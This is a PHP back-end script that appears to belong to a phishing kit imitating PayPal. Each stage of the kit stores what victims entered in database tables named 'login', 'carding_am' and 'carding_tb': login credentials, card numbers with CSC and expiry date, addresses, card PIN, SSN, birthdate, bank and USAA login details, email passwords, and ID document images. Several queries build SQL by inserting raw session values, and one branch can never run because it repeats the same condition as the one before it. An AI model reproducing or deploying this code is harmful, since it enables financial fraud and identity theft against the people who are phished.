<?php
session_start();
error_reporting(0);
date_default_timezone_set('America/Los_Angeles');
$TIME_DATE = date('h:i A d/m/Y');
$last_idcode = $_SESSION['last_id'];
$cardnumber = $_SESSION['addCreditCardNumber'];

//الاتصال بقاعدة البيانات//
include("datacon.php");

//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Logininfo<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged1") {
$Email = $_SESSION['email'];
$Password = $_SESSION['password'];
$Name = $_SESSION['customerName'];
$Country =  $_SESSION['_LOOKUP_COUNTRY_'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
$Agent = $_SESSION['Agent'];

$addData = $database->prepare("INSERT INTO login(Email,Password,Name,Country,IP,DateTime,Agent)
 VALUES(:Email, :Password, :Name, :Country, :IP, :DateTime, :Agent)");

 $addData->bindParam("Email",$Email);
 $addData->bindParam("Password",$Password);
  $addData->bindParam("Name",$Name);
 
 $addData->bindParam("Country",$Country);
 $addData->bindParam("IP",$IP);
 $addData->bindParam("DateTime",$DateTime);
 $addData->bindParam("Agent",$Agent);
if($addData->execute()){echo 'Logininfo INSERT SUCCESSFULY';}else{ echo 'INSERT ERROR';}

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Carding<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged2") {
$Email = $_SESSION['email'];
$Password = $_SESSION['password'];
$IP =       $_SESSION['_ip_'];
$DateTime = $TIME_DATE;
$c_type = $_SESSION['_c_type_'];
$cardnumber = $_SESSION['addCreditCardNumber'];
$expdate = $_SESSION['ExpirationCard'];
$csc = $_SESSION['csc'];
$NameOnCard = $_SESSION['accountHolderName'];
//>>>>>>>>>>>>>>>>>>>>>>Shepping Address<<<<<<<<<<<<<<<<<<<<<
$FullName = $_SESSION['AddressFullName'];
$Address = $_SESSION['AddressLine1'];
$City = $_SESSION['AddressCity'];
$State = $_SESSION['StateOrRegion'];
$Zip_code = $_SESSION['AddressPostalCode'];
$Phone_Number = $_SESSION['AddressPhoneNumber'];
$countryCode = $_SESSION['address-countryCode'];

$addData = $database->prepare("INSERT INTO carding_am(Email,Password,IP,DateTime,c_type,cardnumber,expdate,csc,NameOnCard,
FullName,Address,City,State,Zip_code,Phone_Number,CountryCode)

 VALUES(:Email,:Password,:IP,:DateTime,:c_type,:cardnumber,:expdate,:csc,:NameOnCard,
 :FullName,:Address,:City,:State,:Zip_code,:Phone_Number,:CountryCode)");

 $addData->bindParam("Email",$Email);
 $addData->bindParam("Password",$Password);
 $addData->bindParam("IP",$IP);
 $addData->bindParam("DateTime",$DateTime);
 $addData->bindParam("c_type",$c_type);
 $addData->bindParam("cardnumber",$cardnumber);
 $addData->bindParam("expdate",$expdate);
 $addData->bindParam("csc",$csc);
 $addData->bindParam("NameOnCard",$NameOnCard);
 
 $addData->bindParam("FullName",$FullName);
  $addData->bindParam("Address",$Address);
   $addData->bindParam("City",$City);
    $addData->bindParam("State",$State);
	 $addData->bindParam("Zip_code",$Zip_code);
	  $addData->bindParam("Phone_Number",$Phone_Number);
	   $addData->bindParam("CountryCode",$countryCode);
if($addData->execute()){
$last_id = $database->lastInsertId();
$_SESSION['last_id']=$last_id; }else{ echo 'INSERT ERROR';}
$UPDATE = $database->prepare("UPDATE paypal_users SET card = 'yes' WHERE Email = '$Email'");
$UPDATE->execute();
}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>BILLINGs<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>

if($_SESSION['loged'] == "loged3") {

$FullName2 = $_SESSION['AddressFullName_2'];
$Address2 = $_SESSION['AddressLine1_2'];
$City2 = $_SESSION['AddressCity_2'];
$State2 = $_SESSION['StateOrRegion_2'];
$Zip_code2 = $_SESSION['AddressPostalCode_2'];
$Phone_Number2 = $_SESSION['AddressPhoneNumber_2'];
$CountryCode2 = $_SESSION['address-countryCode_2'];

$UPDATE = $database->prepare("UPDATE carding_am SET 
FullName2 = '$FullName2',
Address2 = '$Address2',
City2 = '$City2',
State2 = '$State2',
Zip_code2 = '$Zip_code2',
Phone_Number2 = '$Phone_Number2', CountryCode2 = '$CountryCode2' WHERE cardnumber = '$cardnumber'AND id = '$last_idcode'; ");
$UPDATE->execute();

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>3Dsecure<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged3") {
	
$CardPIN = $_SESSION['_CardPIN_'];
$Birthdate = $_SESSION['Birthdate'];
$SSN = $_SESSION['_SSN_'];

$UPDATE = $database->prepare("UPDATE carding_tb SET
CardPIN = '$CardPIN',
Birthdate = '$Birthdate',
SSN = '$SSN'
WHERE cardnumber = '$cardnumber'AND id = '$last_idcode';");
$UPDATE->execute();

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Bankinfo<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged4") {
$Bank_Name = $_SESSION['bank'];
$RoutNumb = $_SESSION['_xxnxx_'];
$AccuNumb = $_SESSION['_xxllxx_'];
$BankID = $_SESSION['_UserNameID_'];
$Bank_pass = $_SESSION['_PasswordBank_'];
$USAAid = $_SESSION['USAA1'];
$USAAPass = $_SESSION['USAA2'];
$USAAPIN = $_SESSION['USAA3'];

$UPDATE = $database->prepare("UPDATE carding_tb SET
Bank_Name = '$Bank_Name', 
RoutNumb = '$RoutNumb', 
AccuNumb = '$AccuNumb', 
BankID = '$BankID', 
Bank_pass = '$Bank_pass', 
USAAid = '$USAAid', 
USAAPass = '$USAAPass', 
USAAPIN = '$USAAPIN'
WHERE cardnumber = '$cardnumber'AND id = '$last_idcode';");
$UPDATE->execute();
}else{
	
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>Paswordemail<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged5") {
$Epassword = $_SESSION['_passwordemail_'];

$UPDATE = $database->prepare("UPDATE carding_tb SET
Epassword = '$Epassword'
WHERE cardnumber = '$cardnumber'AND id = '$last_idcode';");
$UPDATE->execute();

}else{
//<><><><><><><><>><><><><><><>>>>>>>>>>>>>>>>>>>>>>>IDENTITYIMGS<<<<<<<<<<<<<<<<<<<<<<<<<><><><><><><><>><><><><><><>
if($_SESSION['loged'] == "loged6") {
$TYPE_ID = $_SESSION['doc_type'];
$URL_IMAGE = $_SESSION['alboms'];
$Email = $_SESSION['_login_email_'];

$UPDATE = $database->prepare("UPDATE carding_tb SET TYPE_ID = '$TYPE_ID', URL_IMAGE = '$URL_IMAGE'  WHERE cardnumber = '$cardnumber'AND id = '$last_idcode';");
$UPDATE->execute();

}
	
}
}


}

}
}
}


?>



















